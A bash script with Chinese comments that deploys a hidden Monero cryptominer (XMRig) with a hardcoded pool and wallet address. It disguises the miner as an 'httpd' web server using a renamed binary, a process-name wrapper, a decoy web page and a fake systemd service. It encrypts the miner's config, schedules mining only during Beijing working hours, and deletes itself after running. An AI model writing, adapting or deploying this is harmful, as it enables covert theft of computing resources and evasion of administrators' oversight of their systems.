#!/bin/bash

# 隐藏进程及其特征的一键部署脚本，支持定时启停和配置文件加密

# 确保脚本以 root 权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

# 检查依赖
for cmd in curl tar gcc systemctl openssl; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，请先安装" 1>&2
        exit 1
    fi
done

# 用户输入矿池 URL 和钱包地址
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入服务器密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}

# 创建目录
mkdir -p /opt/utils /etc/systemd/system/conf.d || { echo "创建目录失败" 1>&2; exit 1; }

# 下载并安装 xmrig
curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/utils || { echo "下载或解压失败" 1>&2; exit 1; }
mv /opt/utils/xmrig-6.22.2/xmrig /opt/utils/httpd || { echo "移动文件失败" 1>&2; exit 1; }
chmod +x /opt/utils/httpd
rm -rf /opt/utils/xmrig-6.22.2

# 创建 wrapper 以伪装进程名
cat > /opt/utils/wrapper.c <<EOF
#include <sys/prctl.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "httpd", 0, 0, 0); // 伪装成 httpd 进程
    execv("/opt/utils/httpd", argv);
    return 0;
}
EOF
gcc -o /opt/utils/wrapper /opt/utils/wrapper.c || { echo "编译 wrapper 失败" 1>&2; exit 1; }
rm /opt/utils/wrapper.c

# 生成明文配置文件
config_file="/etc/systemd/system/conf.d/httpd.conf"
cat > "$config_file" <<EOF
{
    "pools": [
        {
            "url": "$pool_url",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "algo": "rx/0"
        }
    ],
    "print-time": 0,
    "verbose": false,
    "donate-level": 0
}
EOF

# 生成加密密钥
key_file="/etc/systemd/system/conf.d/httpd.key"
openssl rand -base64 32 > "$key_file"
chmod 600 "$key_file"  # 限制访问权限

# 加密配置文件
encrypted_config="/etc/systemd/system/conf.d/httpd.conf.enc"
openssl enc -aes-256-cbc -salt -in "$config_file" -out "$encrypted_config" -pass file:"$key_file" || { echo "加密失败" 1>&2; exit 1; }

# 删除明文配置文件
rm "$config_file"

# 检查 httpd 用户和组是否存在
if ! id "httpd" &>/dev/null; then
    # 如果用户不存在，创建用户和组
    if ! getent group "httpd" &>/dev/null; then
        groupadd -r httpd || { echo "创建组 httpd 失败" 1>&2; exit 1; }
    fi
    useradd -r -s /bin/false -g httpd httpd || { echo "创建用户 httpd 失败" 1>&2; exit 1; }
else
    echo "用户 httpd 已存在，跳过创建步骤"
fi

# 设置 web 服务器
echo "设置web 服务器..."
mkdir -p /var/www || { echo "创建 web 目录失败" 1>&2; exit 1; }
cat > /var/www/index.html <<EOF
<!DOCTYPE html>
<html>
<head><title>Welcome</title></head>
<body>Welcome to our web server.</body>
</html>
EOF

# 创建 systemd 服务文件，修改 ExecStart 以解密配置文件
cat > /etc/systemd/system/httpd.service <<EOF
[Unit]
Description=HTTP Server
After=network.target

[Service]
User=httpd
Group=httpd
ExecStart=/bin/bash -c 'openssl enc -d -aes-256-cbc -in /etc/systemd/system/conf.d/httpd.conf.enc -pass file:/etc/systemd/system/conf.d/httpd.key | /opt/utils/wrapper --config=- --no-color --log-file=/dev/null --threads=8'
Restart=always
CPUQuota=90%  # 限制 CPU 使用率为 90%

[Install]
WantedBy=multi-user.target
EOF

# 创建 stop-httpd.service 用于停止服务
cat > /etc/systemd/system/stop-httpd.service <<EOF
[Unit]
Description=Stop HTTP Server

[Service]
Type=oneshot
ExecStart=/usr/bin/systemctl stop httpd.service
EOF

# 创建定时器：每天上午8:30启动服务
cat > /etc/systemd/system/httpd-start.timer <<EOF
[Unit]
Description=Start HTTP Server at 8:30 AM

[Timer]
OnCalendar=*-*-* 08:30:00
Unit=httpd.service
Persistent=true

[Install]
WantedBy=timers.target
EOF

# 创建定时器：每天下午4:00停止服务
cat > /etc/systemd/system/stop-httpd.timer <<EOF
[Unit]
Description=Stop HTTP Server at 4:00 PM

[Timer]
OnCalendar=*-*-* 16:00:00
Unit=stop-httpd.service
Persistent=true

[Install]
WantedBy=timers.target
EOF

# 重新加载 systemd 并启用定时器
systemctl daemon-reload
systemctl enable httpd-start.timer
systemctl start httpd-start.timer
systemctl enable stop-httpd.timer
systemctl start stop-httpd.timer

# 检查当前时间，决定是否立即启动服务
export TZ=Asia/Shanghai  # 设置时区为北京时间
current_time=$(date +%s)
start_time=$(date -d "today 08:30" +%s)
end_time=$(date -d "today 16:00" +%s)
if [ $current_time -ge $start_time ] && [ $current_time -lt $end_time ]; then
    echo "当前时间在运行时间段内，立即启动服务..."
    systemctl start httpd.service || { echo "服务启动失败" 1>&2; exit 1; }
else
    echo "当前时间不在运行时间段内，等待定时器启动服务..."
fi

# 删除脚本自身
rm -- "$0"
echo "部署完成，服务将每天在北京时间8:30启动，16:00停止！"
